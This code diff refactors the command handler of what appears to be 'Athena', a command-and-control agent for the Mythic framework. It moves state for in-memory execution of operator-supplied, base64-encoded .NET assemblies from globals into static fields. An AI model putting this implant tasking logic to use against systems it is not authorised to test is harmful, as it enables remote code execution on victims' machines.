@@ -15,6 +15,8 @@ namespace Athena.Commands
 
     public class CommandHandler
     {
+        static string executeAssemblyTask = "";
+        static Thread executeAseemblyThread;
         public static void StartJob(MythicJob job)
         {
             switch (job.task.command)
@@ -26,7 +28,7 @@ namespace Athena.Commands
                     FileHandler.downloadFile(j);
                     break;
                 case "execute-assembly":
-                    if (Globals.executeAssemblyTask != "")
+                    if (executeAssemblyTask != "")
                     {
                         job.complete = true;
                         job.errored = true;
@@ -39,7 +41,7 @@ namespace Athena.Commands
                         {
                             job.started = true;
                             job.cancellationtokensource.Token.ThrowIfCancellationRequested();
-                            Globals.executeAssemblyTask = job.task.id;
+                            executeAssemblyTask = job.task.id;
                             ExecuteAssembly ea = JsonConvert.DeserializeObject<ExecuteAssembly>(job.task.parameters);
                             job.taskresult = "";
                             job.hasoutput = true;
@@ -55,8 +57,9 @@ namespace Athena.Commands
                                     {
                                         job.hasoutput = true;
                                         AssemblyHandler.ExecuteAssembly(Misc.Base64DecodeToByteArray(ea.assembly), ea.arguments);
+                                        
                                         //Assembly finished executing.
-                                        Globals.executeAssemblyTask = "";
+                                        executeAssemblyTask = "";
                                         job.complete = true;
                                         Console.SetOut(origStdout);
                                         return;
@@ -64,7 +67,7 @@ namespace Athena.Commands
                                     catch (Exception)
                                     {
                                         //Cancellation was requested, clean up.
-                                        Globals.executeAssemblyTask = "";
+                                        executeAssemblyTask = "";
                                         job.hasoutput = true;
                                         job.complete = true;
                                         job.errored = true;
@@ -73,19 +76,10 @@ namespace Athena.Commands
                                         Globals.alc = new ExecuteAssemblyContext();
                                         return;
                                     }
-                                    //Globals.executeAseemblyThread = new Thread(() =>
-                                    //{
-
-                                    //});
-
-                                    //Globals.executeAseemblyThread.IsBackground = true;
-
-                                    ////Start our assembly.
-                                    //Globals.executeAseemblyThread.Start();
                                 }
                                 catch (Exception e)
                                 {
-                                    Globals.executeAssemblyTask = "";
+                                    executeAssemblyTask = "";
                                     job.complete = true;
                                     job.taskresult = e.Message;
                                     job.errored = true;
@@ -131,7 +125,6 @@ namespace Athena.Commands
                         {
                             //Attempt the cancel.
                             job.cancellationtokensource.Cancel();
-                            Globals.executeAseemblyThread.Interrupt();
 
                             //Wait to see if the cancel took.
                             for (int i = 0; i != 31; i++)
@@ -292,12 +285,11 @@ namespace Athena.Commands
                 case "stop-assembly":
                     var stopAssemblyTask = Task.Run(() => {
                         //Will need to make this work
-                        if (Globals.executeAseemblyThread != null)
+                        if (executeAseemblyThread != null)
                         {
-                            Globals.executeAseemblyThread.Interrupt();
-                            //Globals.executeAseemblyThread.Abort();
+                            executeAseemblyThread.Interrupt();
                             Thread.Sleep(3000);
-                            if (Globals.executeAseemblyThread.IsAlive)
+                            if (executeAseemblyThread.IsAlive)
                             {
                                 //Globals.executeAseemblyThread.Suspend();
                             }
@@ -305,7 +297,7 @@ namespace Athena.Commands
                             job.complete = true;
                             job.taskresult = "Cancellation Requested.";
                             job.hasoutput = true;
-                            Globals.executeAssemblyTask = "";
+                            executeAssemblyTask = "";
                             Globals.alc.Unload();
                         }
                         else
@@ -359,7 +351,7 @@ namespace Athena.Commands
         {
             try
             {
-                MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == Globals.executeAssemblyTask).Value;
+                MythicJob job = Globals.jobs.FirstOrDefault(x => x.Value.task.id == executeAssemblyTask).Value;
                 job.taskresult += e.Value + Environment.NewLine;
                 job.hasoutput = true;
             }
